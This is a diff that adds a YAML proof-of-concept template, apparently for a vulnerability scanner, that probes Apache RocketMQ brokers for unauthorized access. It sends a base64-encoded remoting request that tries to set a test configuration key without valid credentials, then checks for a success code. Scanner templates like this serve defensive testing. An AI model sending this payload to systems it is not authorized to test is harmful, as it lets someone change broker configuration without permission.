@@ -1,0 +1,19 @@
+name: yaml-poc-apache-rocketmq_broker-unauthorized_access-CT-745346
+binding: 3b17b41a-4e81-4e90-817b-e2f59ca1e0b9
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: 0f9df8f2-9c9d-42e4-a03e-c4efeb86617a
+        level: high
+    warning: Harmless
+transport: tcp
+set:
+    payload: base64Decode('AAAAyQAAALF7ImNvZGUiOjI1LCJleHRGaWVsZHMiOnsiQWNjZXNzS2V5Ijoicm9ja2V0bXEyIiwiU2lnbmF0dXJlIjoiK3pkUmRVdWF6aVNRa0hVVXFkcnR3ZzFGOGprPSJ9LCJmbGFnIjowLCJsYW5ndWFnZSI6IkpBVkEiLCJvcGFxdWUiOjAsInNlcmlhbGl6ZVR5cGVDdXJyZW50UlBDIjoiSlNPTiIsInZlcnNpb24iOjQzM310ZXN0X2tleT10ZXN0X3ZhbHVlCg==')
+rules:
+    r0:
+        request:
+            cache: true
+            content: |
+                {{payload}}
+        expression: response.raw.bcontains(b'"code":0') && response.raw.bcontains(b'serializeTypeCurrentRPC')
+expression: r0()
